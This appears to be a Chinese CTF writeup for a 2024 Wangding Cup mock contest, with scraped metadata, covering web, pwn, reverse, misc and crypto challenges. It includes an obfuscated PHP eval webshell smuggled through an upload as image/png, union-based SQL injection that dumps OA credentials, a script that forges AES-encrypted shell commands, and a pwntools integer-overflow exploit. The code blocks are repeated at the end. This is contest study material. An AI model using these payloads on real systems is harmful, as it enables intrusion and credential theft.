---
title: 【相关分享】网鼎杯拟赛 Writeup
contest: 网鼎杯
year: 2024
difficulty: easy
vuln_type: upload
tags:
- 拟赛
- 签到题
- upload.php
- 一句话后门
- Burp抓包改后缀
- 文件上传
- 隼目安全
attack_chain: 1. 签到题：看群公告 /2. /upload.php 上传 PHP 一句话改 .png 后缀 /3. Burp 抓包改后缀 .php /4. 中国蚁剑 / 菜刀连接 webshell /5. 找 flag 文件
key_payload: '/upload.php  .png 改 .php  Content-Type: multipart/form-data'
one_liner: 网鼎杯拟赛 Writeup，签到题 + Web 文件上传改后缀 bypass。
lesson: 文件上传经典 bypass：先传 .png 再 Burp 改后缀；Content-Type 检查可绕过；后门落地用中国蚁剑/菜刀。
quality: medium
full_path: 【相关分享】网鼎杯拟赛Writeup.full.md
meta_path: 【相关分享】网鼎杯拟赛Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【相关分享】网鼎杯拟赛 Writeup。网鼎杯拟赛 Writeup，签到题 + Web 文件上传改后缀 bypass。。经验：文件上传经典 bypass：先传 .png 再 Burp 改后缀；Content-Type 检查可绕过；后门落地用中国蚁...
category: web
subcategory: upload
tools_used:
- BurpSuite
- PHP
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/211855.html
reasoning_chain:
- '签到题: 群公告 → 触发点: 信息收集'
- 'web1 /upload.php → 假设: 上传过滤 Content-Type → 动作: .png 后缀上传 + Burp 改 .php'
- '观察: Content-Type: image/png 绕过 → 中国蚁剑连接 → 读 /flag.txt'
- 'web2 Mozhe 原题 → id=1 order by 5 报错 → 假设: 字段数 4, 可 union 注入'
- '动作: id=-1 union select 1,group_concat(OAname),group_concat(PassWord),4 → 拿到 OA 账号密码 md5'
- md5 解密 → 登录 → flag
- web3 Dirsearch 扫到 /wwwroot.zip → 审计 describedssTest.php → d 函数 AES-128-CBC 解密
- '动作: e($D, $K) 自己加密 cat ../../flag → d 参数传入 → 解密得 flag'
failed_attempts:
- '试图传 .php 直接上传 → 失败: 后端黑名单过滤'
- 'web3 id 传字符串 → 失败: id 是 20241026 一次 md5, 字符串值特定'
key_observations:
- 文件上传 Content-Type 客户端可控, 服务端白名单只查后缀不够
- order by N + union select 是 SQL 注入经典字段探测流程
- AES-128-CBC 加密脚本需要 IV, 还原算法即可构造任意密文
- 源码 zip 备份泄露 (.zip/.bak/.swp) 是审计第一目标
prerequisites:
- BurpSuite 抓包改包基础
- SQL 注入手工探测 (order by / union select / group_concat)
- 中国蚁剑/菜刀 webshell 工具使用
- AES-128-CBC 加解密原理 (openssl_encrypt/iv)
---
# 【相关分享】网鼎杯拟赛Writeup

> 原文: https://www.ctfiot.com/211855.html
> ID: 211855

免责声明

❝

由于传播、利用本公众号“隼目安全”所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号“隼目安全“及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！

签到题

直接看群公告

web1

访问/upload.php

将php一句话改后缀.png然后上传，burp抓包后修改为php

数据包:

POST /upload.php HTTP/1.1
Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
43000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------234681467240373262723660237873
Content-Length: 514
Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
43000
Connection: close
Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
43000/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------234681467240373262723660237873
Content-Disposition: form-data; name="fileToUpload"; filename="Phantom.php"
Content-Type: image/png

<?php class G7LRDcp8 { public function __construct($H2G8N){ @eval("/*Z#£¤h*u@!h3Myrz9616*/".$H2G8N."/*Z#£¤h*u@!h3Myrz9616*/"); }}new G7LRDcp8($_REQUEST['Phantom']);?>
-----------------------------234681467240373262723660237873
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------234681467240373262723660237873—

Antsword连接读取根目录flag.txt

web2

Mozhe原题

注入语句为id=1 order by 1 数字1逐次提升发现是5报错。说明字段数为4

注入语句为id=-1 union select 1,2,3,4 回显2和3，说明可在这两处执行sql语句

接下来就是爆库名，表名，列名，字段

最后payload

GET ?id=-1%20union%20select%201,group_concat(OAname),group_concat(PassWord),4%20from%20OA_UsersCmd5解密后

登录即可获取flag

web3

首先用Dirsearch来扫目录

找到/wwwroot.zip

看了几乎一个多小时，最后把目光锁定在describedssTest.php文件中

解密一手

看到需要传入id，花10块钱解密后发现是20241026的两次md5

这里id参数传入20241026的一次md5 这里看到post传入d参数，这里会用d函数解密

describedssTest.php了解到d函数逻辑后写一个加密脚本

<?php error_reporting(0);
header('Content-type: text/html; charset=utf-8');
$p8 = '3b7430adaed18facca7b799229138b7b';
$a8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
$d8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
$v8 = '0329647546905494';
function e($D, $K)
{
    $cipher = 'aes-128-cbc';
    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS['v8']);
    $result = base64_encode($GLOBALS['v8'] . $encrypted);
    $result = base64_encode($result);
    return $result;
}
function d($D, $K)
{
    $cipher = 'aes-128-cbc';
    $decodedData = base64_decode(base64_decode($D));
    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));
    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS['v8']);
    return $decrypted;
}

echo e("cat ../../../../../../../../flag.txt", $p8);
?>

将运行结果通过d参数post传入

将结果解密

<?php error_reporting(0);
header('Content-type: text/html; charset=utf-8');
$p8 = '3b7430adaed18facca7b799229138b7b';
$a8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
$d8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
$v8 = '0329647546905494';
function e($D, $K)
{
    $cipher = 'aes-128-cbc';
    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS['v8']);
    $result = base64_encode($GLOBALS['v8'] . $encrypted);
    $result = base64_encode($result);
    return $result;
}
function d($D, $K)
{
    $cipher = 'aes-128-cbc';
    $decodedData = base64_decode(base64_decode($D));
    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));
    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS['v8']);
    return $decrypted;
}

echo d("TURNeU9UWTBOelUwTmprd05UUTVORmhoU2xadVkydEVhWFFyVTJoYVVqTXZWSE5CUTBOWlRtOWtha3RqVUc5dVFUVnpZMHB0ZUhsTmVISnZaaTlYU25sYWQwUm9XVEJHY1dWeVNHVlhXR0k9
", $p8);
?>

wdflag{kxfvkehm1111hn02mm5m35bu6dv5gzy8}

REVERSE01

没什么好说的，java附件直接丢GPT一把梭

flag{2024_____W_D_B!}

PWN01

先打开附件

先看看逻辑

首先用户输入一个数字，保存在buffer数组中，并将其转换为整数val

val 必须是非负数，否则报错并退出 如果 val 合法，程序计算doubled = 2 * val并打印它

doubled等于-100时，输出flag

在这里可以利用2147483647整数溢出

Exp

from pwn import *
host = "0192c6987f867c18b31f18e2c806640a.dl7n.dg04.wangdingcup.com"
port = 43007
conn = remote(host, port)
conn.recvuntil(b"Input: ")
payload = str(2147483647 + 1)
conn.sendline(payload.encode())
response = conn.recvall().decode()
print(response)
conn.close()

wdflag{ztzepfh0727r0kt5kx275c2xdd6rq9h6}

MISC01

先丢入Neta

发现GET /home?id=-1 UNION ALL SELECT 1,2,GROUP_CONCAT(id,'-w-d-f-l-a-g{14030b5a31e7984

直接在txt中查找

wdflag{14030b5a31e7984365c08da0ece8dd03}

CRYPTO01

密文pvkq{G!N@L#}

凯撒密码解密

CRYPTO02附件丢入010分析

最后一段东西，不管它是什么，先丢入随波逐流

wdflag{de605a3746fdc919}


```
POST /upload.php HTTP/1.1
Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
43000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------234681467240373262723660237873
Content-Length: 514
Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
43000
Connection: close
Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:
43000/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------234681467240373262723660237873
Content-Disposition: form-data; name="fileToUpload"; filename="Phantom.php"
Content-Type: image/png

<?php class G7LRDcp8 { public function __construct($H2G8N){ @eval("/*Z#£¤h*u@!h3Myrz9616*/".$H2G8N."/*Z#£¤h*u@!h3Myrz9616*/"); }}new G7LRDcp8($_REQUEST['Phantom']);?>
-----------------------------234681467240373262723660237873
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------234681467240373262723660237873—
<?php error_reporting(0);
header('Content-type: text/html; charset=utf-8');
$p8 = '3b7430adaed18facca7b799229138b7b';
$a8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
$d8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
$v8 = '0329647546905494';
function e($D, $K)
{
    $cipher = 'aes-128-cbc';
    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS['v8']);
    $result = base64_encode($GLOBALS['v8'] . $encrypted);
    $result = base64_encode($result);
    return $result;
}
function d($D, $K)
{
    $cipher = 'aes-128-cbc';
    $decodedData = base64_decode(base64_decode($D));
    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));
    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS['v8']);
    return $decrypted;
}

echo e("cat ../../../../../../../../flag.txt", $p8);
?>
<?php error_reporting(0);
header('Content-type: text/html; charset=utf-8');
$p8 = '3b7430adaed18facca7b799229138b7b';
$a8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
$d8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
$v8 = '0329647546905494';
function e($D, $K)
{
    $cipher = 'aes-128-cbc';
    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS['v8']);
    $result = base64_encode($GLOBALS['v8'] . $encrypted);
    $result = base64_encode($result);
    return $result;
}
function d($D, $K)
{
    $cipher = 'aes-128-cbc';
    $decodedData = base64_decode(base64_decode($D));
    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));
    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS['v8']);
    return $decrypted;
}

echo d("TURNeU9UWTBOelUwTmprd05UUTVORmhoU2xadVkydEVhWFFyVTJoYVVqTXZWSE5CUTBOWlRtOWtha3RqVUc5dVFUVnpZMHB0ZUhsTmVISnZaaTlYU25sYWQwUm9XVEJHY1dWeVNHVlhXR0k9
", $p8);
?>
from pwn import *
host = "0192c6987f867c18b31f18e2c806640a.dl7n.dg04.wangdingcup.com"
port = 43007
conn = remote(host, port)
conn.recvuntil(b"Input: ")
payload = str(2147483647 + 1)
conn.sendline(payload.encode())
response = conn.recvall().decode()
print(response)
conn.close()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]